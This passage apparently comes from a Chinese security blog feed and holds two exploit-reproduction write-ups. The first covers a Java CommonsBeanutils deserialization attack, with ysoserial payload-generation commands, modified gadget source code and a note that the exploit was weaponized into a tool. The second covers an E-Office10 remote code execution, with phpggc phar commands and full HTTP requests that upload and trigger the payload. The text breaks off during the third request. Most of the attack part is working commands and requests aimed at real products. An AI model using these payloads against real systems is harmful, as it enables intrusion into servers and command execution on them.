punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-surefire-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.0-M1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trimStackTrace</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trimStackTrace</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPropertyVariables</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.rmi.server.useCodebaseOnly</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.rmi.server.useCodebaseOnly</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPropertyVariables</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span></code></pre><p><strong>åŠ ä¸Šè¿™ä¸ªè¿™ä¸ªæ˜¯é‡ç‚¹&lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;</strong><br>ä¿®æ”¹ä¾èµ–<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291745953.png" alt="mvnä¿®æ”¹ä¾èµ–"><br>è·³è¿‡æµ‹è¯•ç¼–è¯‘(ä¸ä¼šmavençš„å»ç™¾åº¦æœç´¢ä¸€ä¸‹mavené…ç½®è®¾ç½®æœ¬åœ° jaråŒ…åº“)<br>mvn clean package -DskipTests<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291747535.png" alt="ç¼–è¯‘æˆåŠŸ"><br>æˆ‘ä»¬é‡æ–°ç”Ÿæˆexp<br>java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a raw_cmd:â€ping xxxxâ€  â€“dirt-data-length 400000 &gt;curl4.cer<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291750918.png" alt="æ‰“æˆåŠŸäº†"><br>æˆ‘ä»¬æ”¶åˆ°äº†è¯·æ±‚æ‰“æˆåŠŸäº†ç°åœ¨é‡è¦çš„æ˜¯æˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥ç”Ÿæˆä¸€æ³¢å›æ˜¾ã€‚å•¥çš„æˆ‘ä»¬åœ¨æ‰¾åˆ°äº†ä¸€ä¸ªå·¥å…·é‚£å°±æ˜¯è¿™ä¸ª su18å¤§ä½¬çš„å·¥å…·<br><a href="https://github.com/peiqiF4ck/ysoserial">https://github.com/peiqiF4ck/ysoserial</a><br>ä¿®æ”¹jaråŒ…é…ç½®å¹¶ä¸”ç¼–è¯‘ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301115542.png" alt="ä¿®æ”¹jaråŒ…é…ç½®"><br>build æˆåŠŸæˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªæ¥ç”Ÿæˆexp<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301118540.png" alt="buildæˆåŠŸ"><br>java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1 -p â€œEX-TomcatEchoâ€ -ch â€œsu18â€ -dt 3 -dl 400000 &gt;su18.bin<br>okç›´æ¥ä¸€å‘å…¥é­‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301121736.png" alt="å¤ç°å®Œæ¯•"><br>åæ¥æœ‰å°è¯•äº†å‡ æ¬¾å·¥å…·ã€‚è¿™ä¸¤æ¬¾å·¥å…·é‡Œé¢çš„CommonsBeanutils1.javaé‡Œé¢çš„ä»£ç éƒ½è¢«æ”¹äº†åªé€‚ç”¨äºé«˜ç‰ˆæœ¬çš„CommonsBeanutils ã€‚å¦‚æœæƒ³ç”¨æˆ‘ä»¬éœ€è¦æ”¹æ”¹é‡Œé¢çš„ä»£ç </br><br><a href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a> (<strong>è¿™ä¸ªä¿®æ”¹ä»£ç ä¸å¯ä»¥ä½¿ç”¨å¹¶ä¸”å’Œä½œè€…è®¨è®ºäº†ä¸€ä¸‹è¿™ä¸ªé¡¹ç›®ä¸­ä»£ç å­˜åœ¨bugã€‚ä½ç‰ˆæœ¬çš„å³ä½¿ä¿®æ”¹ä»£ç ä¹Ÿå¾ˆéš¾ä½¿ç”¨å¦å¤–è¿™ä¸ªgradleä¸å¥½ç¼–è¯‘ç­‰ä½œè€…æ›´æ–°ä»£ç å§ã€‚åç»­æˆ‘ä¼šå†™ä¸€æ³¢è¿™ä¸ªé¡¹ç›®çš„ç¼–è¯‘æ–¹æ³•ã€‚é¡¹ç›®ä¸é”™ã€‚ä½œè€…æ ¼å±€å¾ˆå¤§ã€‚ä¸çŸ¥é“ä½œè€…ä¿®æ”¹ä»€ä¹ˆäº†ä¸å…¼å®¹ä½ç‰ˆæœ¬çš„CommonsBeanutilsã€‚åˆ°æ—¶å€™ä»£ç ä¿®æ”¹äº†ã€‚æˆ‘ä¼šå†™ä¸€ç¯‡æ–‡ç« ä¸“é—¨ç¼–è¯‘è¿™ä¸ªå› ä¸ºè¿™ä¸ªgradleè¿™ä¸ªä¸å¥½ç¼–è¯‘ã€‚æˆ‘ä¹Ÿæ˜¯åœ¨è¿™ä¸ªé¡¹ç›®ä¸Šè¸©å‘è¸©äº†è‡³å°‘2å¤©å“ˆå“ˆå“ˆä¸€è¨€éš¾å°½å•Šæ‰€ä»¥åç»­å‡ºæ•™ç¨‹ä¸è®©ä½ ä»¬è¸©å‘</strong>)<br><a href="https://github.com/Gary-yang1/JYso(%E8%BF%99%E4%B8%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8,%E6%8D%AE%E8%AF%B4%E8%BF%99%E6%98%AF%E4%B9%8B%E5%89%8D%E7%9A%84%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AEhttps://github.com/qi4L/JYso%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82)">https://github.com/Gary-yang1/JYso(è¿™ä¸ªä¿®æ”¹ä»£ç å¯ä»¥ç›´æ¥ä½¿ç”¨,æ®è¯´è¿™æ˜¯ä¹‹å‰çš„è¿™ä¸ªé¡¹ç›®https://github.com/qi4L/JYsoçš„ä»£ç ã€‚)</a><br>æˆ‘è´´ä¸€ä¸‹ä¿®æ”¹åçš„ä»£ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301134828.png" alt="ä¿®æ”¹éƒ¨åˆ†"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>enumtypes<span class="token punctuation">.</span></span><span class="token class-name">PayloadType</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Authors</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Dependencies</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Gadgets</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">GadgetsYso</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigInteger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token class-name">Starter<span class="token punctuation">.</span>JYsoMode</span><span class="token punctuation">;</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"rawtypes"</span><span class="token punctuation">,</span> <span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Dependencies</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"commons-beanutils:commons-beanutils:1.6.1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Authors</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">Authors</span><span class="token punctuation">.</span>FROHOFF<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> commonsbeanutils1 <span class="token keyword">implements</span> <span class="token class-name">ObjectPayload</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token class-name">PayloadType</span> type<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> param<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token comment">// final Object template;</span>        <span class="token comment">/* if (JYsoMode.contains("yso")) &#123;            template = GadgetsYso.createTemplatesImpl(param[0]);        &#125; else &#123;            template = Gadgets.createTemplatesImpl(type, param);        &#125; */</span><span class="token keyword">final</span> <span class="token class-name">Object</span> template <span class="token operator">=</span> <span class="token class-name">GadgetsYso</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>param<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token string">"lowestSetBit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* queue.add("1");        queue.add("1"); */</span>queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>template<span class="token punctuation">,</span> template<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> queue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ‰§è¡Œç¼–è¯‘,ç„¶åè¿›è¡Œæµ‹è¯•ã€‚ç¼–è¯‘æˆåŠŸæˆ‘ä»¬æ¥æµ‹è¯•<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301141993.png" alt="ç¼–è¯‘æˆåŠŸ"><br>java -jar JYso-3.5.7.jar -yso 1 -g  CommonsBeanutils1  -p â€œEX-TomcatEchoâ€  -ch â€œyso357â€ -dt 3 -dl 400000 &gt;yso3577.bin<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301148222.png" alt="æˆåŠŸå¤ç°"></p><h2 id="è‡ªåŠ¨åŒ–æ­¦å™¨åŒ–"><a href="#è‡ªåŠ¨åŒ–æ­¦å™¨åŒ–" class="headerlink" title="è‡ªåŠ¨åŒ–æ­¦å™¨åŒ–"></a>è‡ªåŠ¨åŒ–æ­¦å™¨åŒ–</h2><p>ä¸Šè¿°æ—¢ç„¶æˆ‘ä»¬æˆåŠŸæ„é€ å‡ºpayloadé‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œæ­¦å™¨åŒ–é›†æˆåˆ°æˆ‘ä»¬çš„å·¥å…·é‡Œé¢ã€‚å¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œæ£€æµ‹ã€‚åˆ©ç”¨æˆªå›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301522728.png" alt="åˆ©ç”¨æˆªå›¾"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åç»­ç­‰Jysoä½œè€…æ›´æ–°ä»£ç ä»¥åæˆ‘å°†ä¸“é—¨å‡ºä¸€ç¯‡æ–‡ç« ç¼–è¯‘Jysoæœ€æ–°ç‰ˆæœ¬ã€‚åç»­åœ¨githubä¸­ä¸€ç±»çš„é¡¹ç›®éƒ½æ”¾åˆ°ä¸€å—æ–¹ä¾¿æ“ä½œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QVD-2024-11354-æœ€æ–°æ³›å¾®E-Office10è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(å¤ç°å‘ç‚¹æ€»ç»“)</title>
      <link href="/penetrationtest/2024/03/articles/b8f9d080e95e9930/"/>
      <url>/penetrationtest/2024/03/articles/b8f9d080e95e9930/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´å¤ç°èƒŒæ™¯"><a href="#æ¼æ´å¤ç°èƒŒæ™¯" class="headerlink" title="æ¼æ´å¤ç°èƒŒæ™¯"></a>æ¼æ´å¤ç°èƒŒæ™¯</h2><p>å‰å‡ å¤©çªç„¶æŸå…¬ä¼—å·å‘å¸ƒäº†æ³›å¾®çš„E-officeè¿œç¨‹ä»£ç æ‰§è¡Œã€‚æœºç¼˜å·§åˆæƒ…å†µä¸‹è·å–åˆ°äº†è¿™ä¸ªæ¼æ´çš„pocã€‚é—æ†¾çš„æ˜¯è¿™ä¸ªæ¼æ´æ˜¯ååºåˆ—åŒ–çš„æ¼æ´å¦‚æœæ‰§è¡Œå…¶ä»–å‘½ä»¤æˆ–è€…getshelléœ€è¦æ›¿æ¢é‡Œé¢çš„å­—èŠ‚ã€‚ç”±äºä»–ä»¬ä½¿ç”¨çš„yakit æ¼æ´pocä½¿ç”¨base64ç¼–ç ã€‚æƒ³è¦æå…¶å®èŠ±ç‚¹æ—¶é—´ä½¿ç”¨ä»£ç è§£å¯†è¿™æ®µbase64å¹¶ä¸”ä½¿ç”¨äºŒè¿›åˆ¶æ–¹å¼å†™å…¥.phar æ–‡ä»¶ã€‚å°±è¡Œäº†ã€‚å§‹ç»ˆè§‰å¾—è‡ªå·±æå‡ºæ¥é‚£æ‰æ˜¯æœ€å¥½çš„äºæ˜¯æˆ‘åˆ†æäº†ä¸€ä¸‹è¿™æ®µpocçš„å…³é”®ä»£ç ä½¿ç”¨è°·æ­Œæœç´¢äº†ä¸€ç¯‡æ–‡ç« ã€‚èµ°åˆ°è¿™é‡Œä½ ä»¬è‚¯å®šæƒ³é—®æ˜¯å“ªç¯‡æ–‡ç« ã€‚åŠ å…¥å°å¯†åœˆæˆ–è€…å†…éƒ¨ç¾¤è·å–å“ˆå“ˆå“ˆå¼€ç©ç¬‘çš„äº†ã€‚ä½†æ˜¯è¿™å¹´å¤´åˆ†äº«exp pocéœ€è¦å†’ç€åŠå¤§çš„é£é™©ã€‚å¦å¤–åˆ«äººç ”ç©¶äº†å¯èƒ½å¥½å‡ ä¸ªæœˆçš„çŸ¥è¯†è¢«ä½ ç›´æ¥åˆ†äº«é‚£æœ‰ç‚¹è¯´ä¸è¿‡å»äº†ã€‚æ”¶è´¹ä¹Ÿæ˜¯æ²¡æ¯›ç—…çš„ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘å°±ç›´æ¥åˆ†äº«äº†æ¯•ç«Ÿè¿™ä¸ªæ¼æ´æŠ˜ç£¨äº†å¾ˆä¹…ã€‚å‚è€ƒé“¾æ¥:è¿™ç¯‡é‡Œé¢æœ‰ç”Ÿæˆpocçš„ä»£ç å…·ä½“æ˜¯å“ªä¸ªè‡ªå·±æ‰¾å¦‚æœè¿™éƒ½æä¸å®šé‚£æˆ‘å°±ä¸è¯´äº† <a href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a><br>å¦å¤–åœ¨githubæœ‰ä¸€ä¸ªç±»ä¼¼äºjavaååºåˆ—åŒ–ç”Ÿæˆçš„å·¥å…·é“¾æ¥åœ¨è¿™é‡Œ<br><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a> ä½†æˆ‘ç”¨è¿™ä¸ªç”Ÿæˆçš„pocä¸è¡Œä¸çŸ¥é“(åŸå› æ ¡éªŒphar hashå€¼)ã€‚è¿™ä¸ªåœ¨kaliä¸Šé¢è¿è¡Œç”Ÿæˆpocå°±è¡Œäº†<br/><br>ç”¨æ³•ï¼šphp phpggc -p phar Laravel&#x2F;RCE1 system whoami  -b</p><p>è¡¥å……ä¸€ä¸‹ç”Ÿæˆå¸¦å›¾ç‰‡å¤´çš„è¯­æ³• ä¸‹é¢è¿™ä¸ªè¯­æ³•æ»¡è¶³è¦æ±‚ ä½¿ç”¨laravel ç‰ˆæœ¬å°äº5.8.xçš„expå°±è¡Œäº†<br>php phpggc -pp up.gif -p phar -o u.phar Laravel&#x2F;RCE1 system dir </p><p>æˆ‘æ˜¯ç”¨<a href="https://xz.aliyun.com/t/8359">https://xz.aliyun.com/t/8359</a> ç”Ÿæˆçš„poc</p><h2 id="æ¼æ´poc"><a href="#æ¼æ´poc" class="headerlink" title="æ¼æ´poc"></a>æ¼æ´poc</h2><p>ç¬¬ä¸€æ­¥ ä¸Šä¼ å¸¦æœ‰ååºåˆ—åŒ–çš„æ–‡ä»¶ poc</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>attachment<span class="token operator">/</span>atuh<span class="token operator">-</span>file HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxxxxxxx<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">72.0</span><span class="token number">.3626</span><span class="token number">.121</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">536</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span> image<span class="token operator">/</span>gif<span class="token punctuation">,</span> image<span class="token operator">/</span>jpeg<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">;</span> q<span class="token operator">=</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token comment">/*; q=.2Connection: closeContent-Type: multipart/form-data; boundary=dsfdsafdsffdsafdsfdfsdf--dsfdsafdsffdsafdsfdfsdfContent-Disposition: form-data; name="Filedata"; filename="register.inc"Content-Type: image/jpegGIF89a&lt;?php __HALT_COMPILER(); ?> //whoami.phar--dsfdsafdsffdsafdsfdfsdf--è¿”å›åŒ…HTTP/1.1 200 OKDate: Sat, 30 Mar 2024 08:15:43 GMTServer: ApacheCache-Control: no-cache, privateVary: Accept-EncodingConnection: closeContent-Type: application/jsonContent-Length: 123&#123;"status":1,"data":&#123;"attachment_id":"idid","attachment_name":"register.inc"&#125;,"runtime":"2.361"&#125;</span></code></pre><p>ç¬¬äºŒæ­¥è§¦å‘ååºåˆ—åŒ–</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>attachment<span class="token operator">/</span>path<span class="token operator">/</span>migrate HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxx<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">72.0</span><span class="token number">.3626</span><span class="token number">.121</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">69</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedsource_path<span class="token operator">=</span><span class="token operator">&amp;</span>desc_path<span class="token operator">=</span>phar<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2F</span><span class="token operator">%</span><span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span><span class="token punctuation">.</span><span class="token punctuation">.</span>%<span class="token number">2F</span>attachment<span class="token operator">%</span><span class="token number">2F</span>è¿”å›HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> OK<span class="token class-name">Date</span><span class="token operator">:</span> <span class="token class-name">Sat</span><span class="token punctuation">,</span> <span class="token number">30</span> <span class="token class-name">Mar</span> <span class="token number">2024</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">51</span> GMT<span class="token class-name">Server</span><span class="token operator">:</span> <span class="token class-name">Apache</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> no<span class="token operator">-</span>cache<span class="token punctuation">,</span> <span class="token keyword">private</span><span class="token class-name">Vary</span><span class="token operator">:</span> <span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>json<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">85</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"runtime"</span><span class="token operator">:</span><span class="token string">"0.342"</span><span class="token punctuation">&#125;</span></code></pre><p>ç¬¬ä¸‰æ­¥:æ‰§è¡Œå¾—åˆ°ç»“æœ</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>eoffice10<span class="token operator">/</span>server<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>api<span class="token operator">/</span>empower<span class="token operator">/</span><span class="token keyword">import</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> 